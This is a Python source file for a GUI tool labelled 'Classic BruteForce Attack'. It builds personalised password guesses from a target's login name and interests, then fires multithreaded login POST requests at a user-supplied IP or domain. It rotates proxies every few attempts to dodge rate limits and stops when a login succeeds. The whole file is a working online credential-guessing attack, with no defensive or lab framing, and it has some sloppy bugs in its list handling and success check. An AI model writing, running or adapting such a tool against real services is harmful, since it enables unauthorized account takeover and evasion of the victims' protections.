import customtkinter as ctk
import threading
import os
import time
import sys
import random
import requests
import json
import queue  # Import queue module

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "..")  # Add parent directory to path

from virtual_keyboard import NormalKeyboard  # Import virtual keyboard

def clear_frame(frame):
    """Clear all widgets in the specified frame."""
    for widget in frame.winfo_children():
        widget.destroy()

def generate_passwords(name, interests, text_box):
    passwords = []
    current_year = 2025  # Can be replaced with dynamic year calculation

    if " " in interests:
        interests.remove(" ")
        interests.replace(" ", "_")

    # Try combinations of name with interests
    passwords.append(name.lower())
    passwords.append(name.upper())
    passwords.append(name + "123")
    passwords.append(name + "2025")

    for interest in interests:
        passwords.append(interest.lower())
        passwords.append(interest.upper())
        passwords.append(interest + "123")
        passwords.append(interest + str(current_year))
        passwords.append(str(current_year) + interest)
        passwords.append("123" + interest)
        passwords.append(interest + "2025")
        passwords.append(interest + random.choice(["_", "-", ".", "@"]) + "1")

        # Add combinations like "<digit><interest><digit>"
        for digit in range(1, 10):  # For digits from 1 to 9
            for i in range(1, 10):  # For each digit from 1 to 9 at the end
                password = str(digit) + interest + str(i)  # Example: 1Gladkih1, 1Gladkih2, ..., 9Gladkih9
                passwords.append(password)
                text_box.insert("end", f"{password}\n")
                text_box.yview("end")  # Scroll down

        # Add digits from 1 to 9 to interests
        random_digits = "".join([str(random.randint(1, 9)) for _ in range(3)])
        password1 = random_digits + interest
        password2 = interest + random_digits
        passwords.append(password1)
        passwords.append(password2)
        text_box.insert("end", f"{password1}\n")
        text_box.insert("end", f"{password2}\n")
        text_box.yview("end")  # Scroll down

        # Try combining name with interests
        password1 = name + random.choice(["-", "_", ".", ""]) + interest
        password2 = interest + random.choice([name, "2025", "password"])
        passwords.append(password1)
        passwords.append(password2)
        text_box.insert("end", f"{password1}\n")
        text_box.insert("end", f"{password2}\n")
        text_box.yview("end")  # Scroll down

    # Try common phrases
    common_phrases = ["password", "letmein", "welcome", "iloveyou", "qwerty", "123456", "sunshine", "qwerty123"]
    for phrase in common_phrases:
        passwords.append(phrase)
        passwords.append(phrase.capitalize())
        passwords.append(phrase + "123")
        text_box.insert("end", f"{phrase}\n")
        text_box.insert("end", f"{phrase.capitalize()}\n")
        text_box.insert("end", f"{phrase}123\n")
        text_box.yview("end")  # Scroll down

    def replace_with_numbers(password):
        replacements = {'a': '4', 'e': '3', 's': '5', 'i': '1', 'o': '0'}
        return ''.join([replacements.get(c, c) for c in password])

    # Convert and display changed passwords in TextBox
    for p in passwords:
        replaced_password = replace_with_numbers(p)
        text_box.insert("end", f"{replaced_password}\n")
        text_box.yview("end")  # Scroll down

    return passwords

def init_classic_bruteforce_ui(parent_frame, go_back_callback=None):
    """Creates the UI for the classic brute-force attack."""
    clear_frame(parent_frame)

    # Main container (horizontal frame)
    container = ctk.CTkFrame(parent_frame)
    container.pack(fill="both", expand=True, padx=10, pady=10)

    # Upper part (data input)
    top_frame = ctk.CTkFrame(container)
    top_frame.pack(side="top", fill="both", expand=True, padx=10, pady=10)

    # Lower part (virtual keyboard)
    bottom_frame = ctk.CTkFrame(container)
    bottom_frame.pack(side="bottom", fill="x", expand=False, padx=10, pady=10)

    # Left part (data input)
    left_frame = ctk.CTkFrame(top_frame, width=300)
    left_frame.pack(side="left", fill="y", padx=(0, 10), pady=10)

    # Right part (divided into top and bottom)
    right_frame = ctk.CTkFrame(top_frame)
    right_frame.pack(side="left", fill="both", expand=True, pady=10)

    # Upper part of right part (TextBox for results)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True, pady=10)

    # Lower part of right part (virtual keyboard)
    bottom_right_frame = ctk.CTkFrame(right_frame)
    bottom_right_frame.pack(side="bottom", fill="x", pady=10)

    # Title label
    label_title = ctk.CTkLabel(left_frame, text="Classic BruteForce Attack", font=("Arial", 24))
    label_title.pack(pady=10)

    # Entry fields
    entry_target = ctk.CTkEntry(left_frame, placeholder_text="Enter IP or Domain", font=("Arial", 16), width=300)
    entry_target.pack(pady=5, padx=(3, 0))

    entry_interest = ctk.CTkEntry(left_frame, placeholder_text="Enter Interest", font=("Arial", 16), width=300)
    entry_interest.pack(pady=5, padx=(3, 0))

    entry_login = ctk.CTkEntry(left_frame, placeholder_text="Enter Login", font=("Arial", 16), width=300)
    entry_login.pack(pady=5, padx=(3, 0))

    entry_threads = ctk.CTkEntry(left_frame, placeholder_text="Enter number of threads", font=("Arial", 16), width=300)
    entry_threads.pack(pady=5, padx=(3, 0))

    text_box = ctk.CTkTextbox(top_right_frame, font=("Arial", 16))
    text_box.pack(fill="both", expand=True, padx=10, pady=10)

    combobox = ctk.CTkComboBox(left_frame, values=["password list", "Generate password"], font=("Arial", 16), fg_color="black", width=300) 
    combobox.set("Select password type")
    combobox.pack(pady=10, padx=(3, 0))

    # Start and save buttons
    start_btn = ctk.CTkButton(left_frame, text="Start Attack", command=lambda: threading.Thread(target=run_attack, daemon=True).start(), font=("Arial", 16), fg_color="#000000", text_color="#FFFFFF", width=40)
    start_btn.pack(pady=7, padx=10, side="left")

    save_btn = ctk.CTkButton(left_frame, text="Save Results", command=lambda: save_results(text_box.get("1.0", "end-1c")), font=("Arial", 16), fg_color="#000000", text_color="#FFFFFF", width=40)
    save_btn.pack(pady=7, padx=10, side="left")

    back_button = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback, font=("Arial", 16), fg_color="#000000", text_color="#FFFFFF", width=40)
    back_button.pack(pady=7, padx=10, side="left")

    def set_target_entry(entry, name):
        keyboard.target_entry = entry

    keyboard = NormalKeyboard(bottom_right_frame, entry_target)  # Create virtual keyboard

    entry_target.bind("<FocusIn>", lambda event: set_target_entry(entry_target, "target"))
    entry_interest.bind("<FocusIn>", lambda event: set_target_entry(entry_interest, "interest"))
    entry_login.bind("<FocusIn>", lambda event: set_target_entry(entry_login, "login"))

    def save_results(results):
        """Save results to a file."""
        if not os.path.exists("results"):
            os.makedirs("results")
        with open(f"results/{entry_login.get()}_results.txt", "w") as f:
            f.write(results)
        text_box.insert("end", "Results saved successfully!\n")
        text_box.yview("end")

    def run_attack():
        proxy_file_path = "working_proxies.txt"
        if not os.path.exists(proxy_file_path):
            text_box.insert("end", "Proxy file not found!\n")
            text_box.yview("end")
            return

        with open(proxy_file_path, "r") as f:
            proxy_list = [line.strip() for line in f if line.strip()]

        """Запускает брутфорс-атаку с HTTP-запросами и выводит результат в TextBox."""
        target_ip = entry_target.get()  # Получаем IP или домен
        interests = entry_interest.get().split(",")  # Получаем интересы (разделенные запятыми)
        login = entry_login.get()  # Получаем логин
        password_type = combobox.get()  # Получаем тип пароля (из файла или сгенерированные)
        threads_count = int(entry_threads.get())  # Получаем количество потоков

        # Формируем URL для атаки
        url = target_ip

        # Обновляем TextBox
        text_box.insert("end", f"Starting attack on {target_ip}...\n")
        text_box.yview("end")  # Прокручиваем TextBox вниз

        if password_type == "password list":
            # Ожидаем файл с паролями
            password_file_path = "passwords.txt"  # Пример пути к файлу с паролями
            if os.path.exists(password_file_path):
                with open(password_file_path, "r") as f:
                    passwords = [line.strip() for line in f.readlines()]
            else:
                text_box.insert("end", "Password list file not found!\n")
                text_box.yview("end")
                return
        elif password_type == "Generate password":
            passwords = generate_passwords(login, interests, text_box)  # Генерируем пароли
        else:
            text_box.insert("end", "Invalid password type selected!\n")
            text_box.yview("end")
            return  # Завершаем выполнение, если тип пароля некорректен

        # Используем Event для остановки других потоков, если пароль найден
        stop_event = threading.Event()

        def attempt_attack(password, proxy):
            lock = threading.Lock()
            if stop_event.is_set():
                return False

            payload = {
                'username': login,
                'password': password
            }

            proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }

            try:
                response = requests.post(url, data=payload, proxies=proxies, timeout=10)
                if response.status_code == 200 or "✅ Вход успешен!" in response.text:
                    with lock:
                        text_box.insert("end", f"Login successful with password: {password}\n")
                        text_box.yview("end")
                    stop_event.set()
                    return True
                else:
                    with lock:
                        text_box.insert("end", f"Attempt with password: {password} failed.\n")
                        text_box.yview("end")
            except requests.exceptions.RequestException as e:
                with lock:
                    text_box.insert("end", f"[Proxy {proxy}] Error: {e}\n")
                    text_box.yview("end")
            return False


        # Запуск многозадачности с использованием потоков
        def run_in_threads():
            # Очередь для паролей
            password_queue = queue.Queue()

            # Заполняем очередь паролями
            for password in passwords:
                password_queue.put(password)

            # Создаем Lock для синхронизации доступа к TextBox

            def attempt_attack_thread():
                proxy = random.choice(proxy_list) if proxy_list else None
                requests_made = 0

                while not password_queue.empty() and not stop_event.is_set():
                    password = password_queue.get()

                    if not proxy:
                        text_box.insert("end", "No proxies available.\n")
                        text_box.yview("end")
                        password_queue.task_done()
                        continue

                    success = attempt_attack(password, proxy)
                    password_queue.task_done()

                    requests_made += 1
                    if requests_made >= 5:
                        proxy = random.choice(proxy_list)
                        requests_made = 0

                    if success:
                        break

            threads = []
            for _ in range(threads_count):
                thread = threading.Thread(target=attempt_attack_thread)
                threads.append(thread)
                thread.start()

            # Ожидаем завершения всех потоков
            for thread in threads:
                thread.join()

        # Запускаем выполнение многозадачной атаки
        run_in_threads()